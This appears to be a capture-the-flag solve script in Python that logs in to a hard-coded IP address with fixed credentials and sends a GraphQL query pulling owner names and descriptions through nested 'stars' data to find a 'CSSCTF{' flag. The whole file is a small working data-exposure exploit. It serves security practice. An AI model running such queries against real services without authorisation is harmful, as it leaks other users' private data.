#!/usr/bin/env python3
import json
import time
import urllib.request

BASE = "http://34.116.80.78:9982"


def login():
    data = b"username=cadet&password=star"
    req = urllib.request.Request(
        BASE + "/login",
        data=data,
        headers={"content-type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        cookie = r.headers.get("Set-Cookie", "").split(";", 1)[0]
        assert cookie.startswith("session="), cookie
        return cookie


def gql(cookie, query, retries=12):
    body = json.dumps({"query": query}).encode()
    for _ in range(retries):
        try:
            req = urllib.request.Request(
                BASE + "/graphql",
                data=body,
                headers={"Cookie": cookie, "content-type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode())
        except Exception:
            time.sleep(0.7)
    raise RuntimeError("graphql failed")


def main():
    cookie = login()
    resp = gql(
        cookie,
        """
        query {
          stars {
            id
            name
            owner { id first_name last_name description }
          }
        }
        """,
    )
    for star in resp["data"]["stars"]:
        desc = (star.get("owner") or {}).get("description") or ""
        if "CSSCTF{" in desc:
            print(desc)
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
